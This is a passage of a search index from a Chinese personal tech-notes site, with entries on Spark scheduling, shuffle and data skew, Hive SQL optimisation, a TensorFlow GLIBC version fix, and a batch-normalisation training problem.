minShareRatio2 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff1b\u5982\u679c minShareRatio2 \u5c0f\u4e8e minShareRatio1 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002\u5982\u679c minShareRatio1 \u548c minShareRatio2 \u76f8\u7b49\uff0c\u8fd8\u9700\u8981\u5bf9 s1 \u548c s2 \u7684\u540d\u5b57\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c s1 \u7684\u540d\u5b57\u5c0f\u4e8e s2 \u7684\u540d\u5b57\uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 minShareRatio \u662f\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\u91cf\u4e0e minShare \u4e4b\u95f4\u7684\u6bd4\u503c\u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u518d\u5bf9 taskToWeightRatio1 \u548c taskToWeightRatio2 \u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c taskToWeightRatio1 \u5c0f\u4e8e taskToWeightRatio2 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff1b\u5982\u679c taskToWeightRatio2 \u5c0f\u4e8e taskToWeightRatio1 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002\u5982\u679c taskToWeightRatio1 \u548c taskToWeightRatio2 \u76f8\u7b49\uff0c\u8fd8\u9700\u8981\u5bf9 s1 \u548c s2 \u7684\u540d\u5b57\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c s1 \u7684\u540d\u5b57\u5c0f\u4e8e s2 \u7684\u540d\u5b57\uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 taskToWeightRatio \u662f\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\u91cf\u4e0e\u6743\u91cd \uff08weight\uff09 \u4e4b\u95f4\u7684\u6bd4\u503c\u3002","title":"3.4. Spark\u7684TaskScheduler\u662f\u600e\u4e48\u5206\u914dTask\u7684"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#35-spark","text":"\u8fd9\u7bc7 \u7f8e\u56e2\u6280\u672f\u56e2\u961f\u7684\u6587\u7ae0 \u5199\u5f97\u975e\u5e38\u8be6\u7ec6\u3002","title":"3.5. Spark\u54ea\u4e9b\u90e8\u5206\u53ef\u4ee5\u4f18\u5316"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#36-sparkshuffle","text":"Shuffle \u9636\u6bb5\u53ef\u8fdb\u4e00\u6b65\u5212\u5206\u6210\u4e09\u90e8\u5206\uff1a Shuffle Write\u3001Shuffle Read \u548c aggregate \u3002 Shuffle Write \uff1a\u4e00\u6279\u4efb\u52a1 \uff08ShuffleMapTask\uff09 \u5c06\u7a0b\u5e8f\u8f93\u51fa\u7684\u4e34\u65f6\u6570\u636e\u5199\u5230\u672c\u5730\u78c1\u76d8\u3002\u7531\u4e8e\u6bcf\u4e2a\u4efb\u52a1\u4ea7\u751f\u7684\u6570\u636e\u8981\u88ab\u4e0b\u4e00\u4e2a\u9636\u6bb5\u7684\u6bcf\u4e2a\u4efb\u52a1\u8bfb\u53d6\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u5b58\u5165\u78c1\u76d8\u65f6\u9700\u5bf9\u6570\u636e\u5206\u533a\uff0c\u5206\u533a\u53ef\u4ee5\u4f7f\u7528Hash\u4e0eSort\u4e24\u79cd\u65b9\u6cd5\uff1b Shuffle Read \uff1a\u4e0b\u4e00\u4e2a\u9636\u6bb5\u542f\u52a8\u4e00\u6279\u65b0\u4efb\u52a1 \uff08ResultTask\uff09 \uff0c\u5b83\u4eec\u5404\u81ea\u542f\u52a8\u4e00\u4e9b\u7ebf\u7a0b\u8fdc\u7a0b\u8bfb\u53d6 Shuffle Write \u4ea7\u751f\u7684\u6570\u636e\uff1b Aggregate \uff1a\u4e00\u65e6\u6570\u636e\u88ab\u8fdc\u7a0b\u62f7\u8d1d\u8fc7\u6765\u540e\uff0c\u63a5\u4e0b\u6765\u9700\u6309\u7167 key \u5c06\u6570\u636e\u7ec4\u7ec7\u5728\u4e00\u8d77\uff0c\u4e3a\u540e\u7eed\u8ba1\u7b97\u505a\u51c6\u5907\u3002","title":"3.6. Spark\u7684Shuffle\u8fc7\u7a0b"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#37-spark","text":"\u907f\u514d shuffle\uff0c\u53ef\u5728\u6570\u636e\u8f93\u5165 spark \u4e4b\u524d\u8fdb\u884c shuffle\uff0c\u6bd4\u5982\u5728 Hive \u4e2d\u6309\u7167 key \u8fdb\u884c\u5206\u7ec4\u3002\u6216\u8005 \u7528 map \u7b49\u66ff\u4ee3 shuffle\uff0c\u4e5f\u5c31\u662f\u5c06 reduce join \u53d8\u6210 map join\u3002\u5982\u679c\u5176\u4e2d\u6709\u4e00\u4e2a RDD \u5f88\u5c0f\uff0c\u5c31\u53ef\u4ee5\u91c7\u7528 \u5e7f\u64ad\u5c0f RDD + map \u5927 RDD \u5b9e\u73b0 join \u529f\u80fd\uff0c\u5728map\u4e2d\u5bf9\u5c0fRDD\u7684key\u8fdb\u884c\u904d\u5386\uff0c\u5982\u679ckey\u76f8\u540c\u5219\u6309\u7167\u89c4\u5219\u805a\u5408\u3002 \u5982\u679c\u907f\u514d\u4e0d\u4e86 shuffle\uff0c\u5c31\u51cf\u5c11 reduce task \u7684\u6570\u636e\u91cf\uff0c\u5982\u7f29\u5c0f key \u7c92\u5ea6\u3001\u589e\u52a0 reduce task \u6570\u91cf\u3002\u6216\u901a\u8fc7\u968f\u673a\u6570\u591a\u6b21\u805a\u5408\uff08\u52a0\u76d0\uff09\uff0c\u51cf\u5c11\u6bcf\u6b21\u805a\u5408\u7684\u6570\u636e\u91cf\uff0c\u805a\u5408\u4e4b\u540e\uff0c\u628a\u52a0\u4e86\u76d0\u7684key_salt \u518d\u8f6c\u56de key\uff0c\u7136\u540e\u5bf9 key \u518d\u6b21\u805a\u5408\u3002 \u5176\u4ed6\u60c5\u51b5\uff0c\u591a\u4e2a key \u5bfc\u81f4\u6570\u636e\u503e\u659c\uff0c\u65e0\u6cd5\u901a\u8fc7\u91c7\u6837\u786e\u5b9a\u54ea\u4e2a key \u6570\u636e\u91cf\u5927\u3002\u6211\u4eec\u5c31\u9700\u8981\u5bf9\u4e00\u4e2a RDD \u6269\u5bb9\uff0c\u5bf9\u53e6\u4e00\u4e2a RDD \u7a00\u91ca\uff0c\u518d\u8fdb\u884c join\u3002 \u53c2\u8003\u81ea \u535a\u5ba2\u56ed\u535a\u5ba2 \u3002","title":"3.7. Spark\u9047\u5230\u6570\u636e\u503e\u659c\u600e\u4e48\u529e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#38-sparkhadoop","text":"\u5e94\u7528\u573a\u666f\u4e0d\u540c Hadoop\u548cSpark\u4e24\u8005\u90fd\u662f\u5927\u6570\u636e\u6846\u67b6\uff0c\u4f46\u662f\u5404\u81ea\u5e94\u7528\u573a\u666f\u662f\u4e0d\u540c\u7684\u3002Hadoop\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\u67b6\u6784\uff0c\u5b83\u5c06\u5de8\u5927\u7684\u6570\u636e\u96c6\u5206\u6d3e\u5230\u4e00\u4e2a\u7531\u666e\u901a\u8ba1\u7b97\u673a\u7ec4\u6210\u7684\u96c6\u7fa4\u4e2d\u7684\u591a\u4e2a\u8282\u70b9\u8fdb\u884c\u5b58\u50a8\uff0c\u964d\u4f4e\u4e86\u786c\u4ef6\u7684\u6210\u672c\u3002Spark\u662f\u90a3\u4e48\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u5bf9\u90a3\u4e9b\u5206\u5e03\u5f0f\u5b58\u50a8\u7684\u5927\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\u5de5\u5177\uff0c\u5b83\u8981\u501f\u52a9hdfs\u7684\u6570\u636e\u5b58\u50a8\u3002 \u5904\u7406\u901f\u5ea6\u4e0d\u540c hadoop\u7684MapReduce\u662f\u5206\u6b65\u5bf9\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\uff0c\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u8fdb\u884c\u4e00\u6b21\u5904\u7406\uff0c\u5c06\u7ed3\u679c\u5199\u5230\u78c1\u76d8\uff0c\u7136\u540e\u5728\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u66f4\u65b0\u540e\u7684\u6570\u636e\uff0c\u518d\u6b21\u8fdb\u884c\u7684\u5904\u7406\uff0c\u6700\u540e\u518d\u5c06\u7ed3\u679c\u5b58\u5165\u78c1\u76d8\uff0c\u8fd9\u5b58\u53d6\u78c1\u76d8\u7684\u8fc7\u7a0b\u4f1a\u5f71\u54cd\u5904\u7406\u901f\u5ea6\u3002spark\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u628a\u4e2d\u95f4\u6570\u636e\u653e\u5230\u5185\u5b58\u4e2d\uff0c\uff0c\u5b8c\u6210\u6240\u6709\u5fc5\u987b\u7684\u5206\u6790\u5904\u7406\uff0c\u5c06\u7ed3\u679c\u5199\u56de\u96c6\u7fa4\uff0c\u6240\u4ee5spark\u66f4\u5feb\u3002 \u5bb9\u9519\u6027\u4e0d\u540c Hadoop\u5c06\u6bcf\u6b21\u5904\u7406\u540e\u7684\u6570\u636e\u90fd\u5199\u5165\u5230\u78c1\u76d8\u4e0a\uff0c\u57fa\u672c\u8c08\u4e0d\u4e0a\u65ad\u7535\u6216\u8005\u51fa\u9519\u6570\u636e\u4e22\u5931\u7684\u60c5\u51b5\u3002Spark\u7684\u6570\u636e\u5bf9\u8c61\u5b58\u50a8\u5728\u5f39\u6027\u5206\u5e03\u5f0f\u6570\u636e\u96c6 RDD\uff0cRDD\u662f\u5206\u5e03\u5728\u4e00\u7ec4\u8282\u70b9\u4e2d\u7684\u53ea\u8bfb\u5bf9\u8c61\u96c6\u5408\uff0c\u5982\u679c\u6570\u636e\u96c6\u4e00\u90e8\u5206\u4e22\u5931\uff0c\u5219\u53ef\u4ee5\u6839\u636e\u4e8e\u6570\u636e\u884d\u751f\u8fc7\u7a0b\u5bf9\u5b83\u4eec\u8fdb\u884c\u91cd\u5efa\u3002\u800c\u4e14RDD \u8ba1\u7b97\u65f6\u53ef\u4ee5\u901a\u8fc7 CheckPoint \u6765\u5b9e\u73b0\u5bb9\u9519\u3002 \u53c2\u8003\u81ea \u77e5\u4e4e\u6587\u7ae0 \u3002","title":"3.8. Spark\u548cHadoop\u7684\u533a\u522b"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#4-hive","text":"","title":"4. Hive"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#41-hive","text":"Hive \u662f\u4e00\u4e2a\u6570\u636e\u4ed3\u5e93\u5de5\u5177\uff0c\u5b83\u975e\u5e38\u9002\u5408\u6570\u636e\u7684\u7edf\u8ba1\u5206\u6790\uff0c\u5b83\u53ef\u4ee5\u5c06\u6570\u636e\u6587\u4ef6\u7ec4\u6210\u8868\u683c\u5e76\u5177\u6709\u5b8c\u6574\u7684\u7c7b SQL \u67e5\u8be2\u529f\u80fd\uff0c\u8fd8\u53ef\u5c06\u7c7b SQL \u8bed\u53e5\u81ea\u52a8\u8f6c\u6362\u6210 MapReduce \u4efb\u52a1\u6765\u8fd0\u884c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4f7f\u7528 Hive \uff0c\u53ef\u4ee5\u5927\u5e45\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u3002 \u548c\u4f20\u7edf\u7684\u6570\u636e\u4ed3\u5e93\u4e00\u6837\uff0c Hive \u4e3b\u8981\u7528\u6765\u8bbf\u95ee\u548c\u7ba1\u7406\u6570\u636e\u3002\u4e0e\u4f20\u7edf\u6570\u636e\u4ed3\u5e93\u8f83\u5927\u7684\u533a\u522b\u662f\uff0c Hive \u53ef\u4ee5\u5904\u7406\u8d85\u5927\u89c4\u6a21\u7684\u6570\u636e\uff0c\u53ef\u6269\u5c55\u6027\u548c\u5bb9\u9519\u6027\u975e\u5e38\u5f3a\u3002\u7531\u4e8e Hive \u6709\u7c7b SQL \u7684\u67e5\u8be2\u8bed\u8a00\uff0c\u6240\u4ee5\u5b66\u4e60\u6210\u672c\u76f8\u5bf9\u6bd4\u8f83\u4f4e\u3002 \u533a\u522b Hive RDBMS \u67e5\u8be2\u8bed\u8a00 HQL SQL \u6570\u636e\u5b58\u50a8\u4f4d\u7f6e HDFS Local FS \u6570\u636e\u683c\u5f0f\u5224\u65ad \u67e5\u8be2\u65f6\u5224\u65ad \u63d2\u5165\u65f6\u5224\u65ad \u6267\u884c MR Executor \u6267\u884c\u5ef6\u8fdf \u9ad8 \u4f4e \u5904\u7406\u6570\u636e\u89c4\u6a21 \u5927 \u5c0f","title":"4.1. Hive\u7684\u4f5c\u7528"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#42-hive-sql","text":"join \u65e0\u5173\u7684\u4f18\u5316 group by\u5f15\u8d77\u7684\u503e\u659c\u4f18\u5316 set hive.map.aggr = true set hive.groupby.skewindata=true \u6b64\u65f6 Hive \u5728\u6570\u636e\u503e\u659c\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\uff0c\u751f\u6210\u7684\u67e5\u8be2\u8ba1\u5212\u4f1a\u6709\u4e24\u4e2a MapReduce Job \u3002\u7b2c\u4e00\u4e2a MapReduce Job \u4e2d\uff0c Map \u7684\u8f93\u51fa\u7ed3\u679c\u96c6\u5408\u4f1a\u968f\u673a\u5206\u5e03\u5230 Reduce \u4e2d\uff0c\u6bcf\u4e2a Reduce \u505a\u90e8\u5206\u805a\u5408\u64cd\u4f5c\u5e76\u8f93\u51fa\u7ed3\u679c\uff0c\u8fd9\u6837\u5904\u7406\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684 GroupByKey \u6709\u53ef\u80fd\u88ab\u5206\u5e03\u5230\u4e0d\u540c\u7684 Reduce \u4e2d\uff0c\u4ece\u800c\u8fbe\u5230\u8d1f\u8f7d\u5747\u8861\u7684\u76ee\u7684\uff1b\u7b2c\u4e8c\u4e2a MapReduce Job \u518d\u6839\u636e\u9884\u5904\u7406\u7684\u6570\u636e\u7ed3\u679c\u6309\u7167 GroupBy Key \u5206\u5e03\u5230 Reduce \u4e2d\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u540c\u7684 GroupBy Key \u88ab\u5206\u5e03\u5230\u540c\u4e00\u4e2a Reduce \u4e2d\uff09\uff0c\u6700\u540e\u5b8c\u6210\u6700\u7ec8\u7684\u805a\u5408\u64cd\u4f5c count distinct \u4f18\u5316 \u4f7f\u7528 count distinct \uff0c\u5f88\u5bb9\u6613\u5f15\u8d77\u6027\u80fd\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5148 group by \u518d count \u7684\u65b9\u5f0f\u6765\u4f18\u5316\u3002","title":"4.2. Hive SQL\u4f18\u5316"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#43-hive-sqljoin","text":"\u5927\u8868 Join \u5c0f\u8868\u4f18\u5316 \u53ef\u4ee5\u901a\u8fc7 mapjoin \u7684\u65b9\u5f0f\u6765\u4f18\u5316\uff0c\u53ea\u9700\u6dfb\u52a0 mapjoin hint \u5373\u53ef\u3002 select /*+mapjoin(b)*/ \u5927\u8868 Join \u5927\u8868\u4f18\u5316 \u5c3d\u7ba1B\u8868\u65e0\u6cd5\u76f4\u63a5 mapjoin \uff0c\u4f46\u53ef\u4ee5\u95f4\u63a5\u5730 mapjoin \u5b83\u3002 \u6b64\u601d\u8def\u6709\u4e24\u79cd\u9014\u5f84\uff1a\u9650\u5236\u884c\u548c\u9650\u5236\u5217\u3002 \u9650\u5236\u884c\u7684\u601d\u8def\u662f\u4e0d\u9700\u8981 Join B \u5168\u8868\uff0c\u800c\u53ea\u9700\u8981 Join \u5176\u5728 A \u8868\u4e2d\u5b58\u5728\u7684\u3002 \u9650\u5236\u5217\u7684\u601d\u8def\u662f\u53ea\u53d6\u9700\u8981\u7684\u5b57\u6bb5\u3002 Join \u65f6\u7528 case when \u8bed\u53e5 \u5176\u6838\u5fc3\u662f\u5c06\u8fd9\u4e9b\u5f15\u8d77\u503e\u659c\u7684\u503c\u968f\u673a\u5206\u53d1\u5230 Reduce \uff0c\u5176\u4e3b\u8981\u6838\u5fc3\u903b\u8f91\u5728\u4e8e Join \u65f6\u5bf9\u8fd9\u4e9b\u7279\u6b8a\u503c Concat \u968f\u673a\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u968f\u673a\u5206\u53d1\u7684\u76ee\u7684\u3002","title":"4.3. Hive SQL\u4e2d\u7684Join\u4f18\u5316\u65b9\u6cd5"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#5","text":"\u300a\u4ece\u96f6\u5f00\u59cb\u5b66Hadoop\u5927\u6570\u636e\u5206\u6790\u300b. \u6e29\u6625\u6c34\u3001\u6bd5\u6d01\u99a8 \u300a\u4f01\u4e1a\u7ea7\u5927\u6570\u636e\u5e73\u53f0\u6784\u5efa\uff1a\u67b6\u6784\u4e0e\u5b9e\u73b0\u300b. \u6731\u51ef \u300aSpark\u6280\u672f\u5185\u5e55\uff1a\u6df1\u5165\u89e3\u6790Saprk\u5185\u6838\u67b6\u6784\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u539f\u7406\u300b. \u5f20\u5b89\u7ad9 \u300a\u5927\u6570\u636e\u6280\u672f\u4f53\u7cfb\u8be6\u89e3\uff1a\u539f\u7406\u3001\u67b6\u6784\u4e0e\u5b9e\u8df5\u300b. \u8463\u897f\u6210 \u300a\u79bb\u7ebf\u548c\u5b9e\u65f6\u5927\u6570\u636e\u5f00\u53d1\u5b9e\u6218\u300b. \u6731\u677e\u5cad \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u53c2\u8003\u4e66\u7c4d"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/1.Version_GLIBC_Not_Found/","text":"Tensorflow \u62a5\u9519 version 'GLIBC_2.23' not found # \u76ee\u5f55 # [toc] 1. \u80cc\u666f # \u6700\u8fd1\u7528\u5b66\u6821\u7684\u670d\u52a1\u5668\u8dd1\u6a21\u578b\uff0c\u5b89\u88c5\u8fd0\u884cTensorflow\u7684\u65f6\u5019\u62a5\u9519\u4e86 GLIBC_2.23' not found \uff0c\u56e0\u4e3a\u6ca1\u6709root\u6743\u9650\uff0c\u6ca1\u529e\u6cd5\u5347\u7ea7GLIBC\uff0c\u6700\u540e\u627e\u5230\u4e86\u53e6\u5916\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5728\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u3002 2. \u89e3\u51b3\u65b9\u6848 # /lib64/libm.so.6: version `GLIBC_2.23' not found \u64cd\u4f5c\u7cfb\u7edfGLIBC\u7248\u672c\u8f83\u4f4e\u5bfc\u81f4\u6b64\u95ee\u9898\u3002 \u6211\u7684 Tensorflow \u7248\u672c\u4e3a1.13.1\u3002\u6211\u53d1\u73b0\u5728Python 3.7 \u4e2d\u4f1a\u51fa\u73b0\u6b64\u95ee\u9898\uff0c\u800cPython3.6\u4e2d\u4e0d\u4f1a\u51fa\u73b0\u3002 \u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u4f7f\u7528Anaconda\u521b\u5efapython3.6\u865a\u62df\u73af\u5883 conda create -n python3.6 python=3.6 \u6fc0\u6d3b\u865a\u62df\u73af\u5883 conda activate python3.6 \u5b89\u88c5tensorflow pip install tensorflow==1.13.1 \u5982\u679c\u8981\u5728\u865a\u62df\u73af\u5883\u4e2d\u4f7f\u7528ipython\uff0c\u5b89\u88c5nbconvert pip install nbconvert \u518d\u91cd\u65b0 import tensorflow as tf \uff0c\u5e94\u8be5\u5c31\u4e0d\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\u4e86\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.Version GLIBC Not Found"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/1.Version_GLIBC_Not_Found/#tensorflow-version-glibc_223-not-found","text":"","title":"Tensorflow \u62a5\u9519 version 'GLIBC_2.23' not found"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/1.Version_GLIBC_Not_Found/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/1.Version_GLIBC_Not_Found/#1","text":"\u6700\u8fd1\u7528\u5b66\u6821\u7684\u670d\u52a1\u5668\u8dd1\u6a21\u578b\uff0c\u5b89\u88c5\u8fd0\u884cTensorflow\u7684\u65f6\u5019\u62a5\u9519\u4e86 GLIBC_2.23' not found \uff0c\u56e0\u4e3a\u6ca1\u6709root\u6743\u9650\uff0c\u6ca1\u529e\u6cd5\u5347\u7ea7GLIBC\uff0c\u6700\u540e\u627e\u5230\u4e86\u53e6\u5916\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5728\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/1.Version_GLIBC_Not_Found/#2","text":"/lib64/libm.so.6: version `GLIBC_2.23' not found \u64cd\u4f5c\u7cfb\u7edfGLIBC\u7248\u672c\u8f83\u4f4e\u5bfc\u81f4\u6b64\u95ee\u9898\u3002 \u6211\u7684 Tensorflow \u7248\u672c\u4e3a1.13.1\u3002\u6211\u53d1\u73b0\u5728Python 3.7 \u4e2d\u4f1a\u51fa\u73b0\u6b64\u95ee\u9898\uff0c\u800cPython3.6\u4e2d\u4e0d\u4f1a\u51fa\u73b0\u3002 \u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u4f7f\u7528Anaconda\u521b\u5efapython3.6\u865a\u62df\u73af\u5883 conda create -n python3.6 python=3.6 \u6fc0\u6d3b\u865a\u62df\u73af\u5883 conda activate python3.6 \u5b89\u88c5tensorflow pip install tensorflow==1.13.1 \u5982\u679c\u8981\u5728\u865a\u62df\u73af\u5883\u4e2d\u4f7f\u7528ipython\uff0c\u5b89\u88c5nbconvert pip install nbconvert \u518d\u91cd\u65b0 import tensorflow as tf \uff0c\u5e94\u8be5\u5c31\u4e0d\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\u4e86\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2. \u89e3\u51b3\u65b9\u6848"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/TensorFlow/TroubleShoot/2.BN%E5%B1%82%E5%AF%BC%E8%87%B4TensorFlow2.3%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83%E6%95%88%E6%9E%9C%E8%BE%83%E5%B7%AE/","text":"BN\u5c42\u5bfc\u81f4TensorFlow2.3\u6a21\u578b\u8bad\u7ec3\u6548\u679c\u8f83\u5dee # \u76ee\u5f55 # [toc] 1. \u80cc\u666f # \u6700\u8fd1\u6211\u628aTensorFlow\u4ece 1.13 \u5347\u7ea7\u5230\u4e86 2.3 \u7248\u672c\uff0c\u7528\u6765\u8dd1\u4e4b\u524d\u7684\u4e00\u4e2a\u9a8c\u8bc1\u7801\u8bc6\u522b\u7684\u9879\u76ee\u65f6\uff0c\u53d1\u73b0 1.13 \u51c6\u786e\u7387 95% \u4ee5\u4e0a\uff0c 2.3 \u53ea\u6709 1% \u3002 \u5b8c\u6574\u4ee3\u7801\u8bf7\u53c2\u8003 Github \u3002 2. \u6a21\u578b # \u6a21\u578b\u7ed3\u6784\u5982\u4e0b\u3002 _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= input_1 (InputLayer) (None, 80, 120, 1) 0 _________________________________________________________________ conv2d (Conv2D) (None, 78, 118, 32) 320 _________________________________________________________________ conv2d_1 (Conv2D) (None, 76, 116, 32) 9248 _________________________________________________________________ batch_normalization_v1 (Batc (None, 76, 116, 32) 128 _________________________________________________________________ max_pooling2d (MaxPooling2D) (None, 38, 58, 32) 0 _________________________________________________________________ conv2d_2 (Conv2D) (None, 36, 56, 64) 18496 _________________________________________________________________ conv2d_3 (Conv2D) (None, 34, 54, 64) 36928 _________________________________________________________________ batch_normalization_v1_1 (Ba (None, 34, 54, 64) 256 _________________________________________________________________ max_pooling2d_1 (MaxPooling2 (None, 17, 27, 64) 0 _________________________________________________________________ conv2d_4 (Conv2D) (None, 15, 25, 128) 73856 _________________________________________________________________ conv2d_5 (Conv2D) (None, 